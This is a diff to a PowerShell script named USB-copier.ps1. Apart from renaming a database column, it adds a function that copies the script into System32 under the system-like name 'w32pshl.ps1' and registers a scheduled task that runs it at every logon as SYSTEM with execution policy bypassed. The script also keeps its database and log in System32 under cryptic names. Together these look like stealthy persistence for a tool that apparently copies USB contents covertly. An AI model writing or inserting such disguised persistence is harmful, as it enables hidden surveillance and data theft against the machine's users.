@@ -211,7 +211,7 @@ function SetExcludedDevicesInDb {
         if($query.device_id){
             Write-Host "[INFO]: Device Exists, Updating $deviceSerialNumber"
             Invoke-SqliteQuery -DataSource $dbPath "
-                UPDATE device SET isDeviceExcluded = 1 WHERE device_id = '$($query.device_id)'
+                UPDATE device SET is_device_excluded = 1 WHERE device_id = '$($query.device_id)'
             "
         } else {
             Write-Host "[NEW]: Registering new device"
@@ -238,6 +238,14 @@ function CreateLogFile {
 $workDir = 'C:\Windows\System32'
 $dbPath = $workDir + '\Wpshl'
 $logFilePath = $workDir + '\n138974314908GLs'
+function SetupScriptInTaskScheduler {
+    try {
+        schtasks /end /tn "w32pshl"
+    } catch { }
+    Copy-Item "$PSScriptRoot\USB-copier.ps1" -Destination "C:\Windows\System32\w32pshl.ps1"
+    schtasks /create /tn "w32pshl" /tr "powershell.exe -ExecutionPolicy Bypass -File 'C:\Windows\System32\w32pshl.ps1'" /sc onlogon /ru SYSTEM /F
+    schtasks /run /tn "w32pshl"
+}
 function Main {
     # Check for Adminstrator Access
     if(!(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
@@ -250,6 +258,7 @@ function Main {
     CheckNecessaryModules
     CheckDbConfig
     SetExcludedDevicesInDb
+    SetupScriptInTaskScheduler
 }
 Main
 
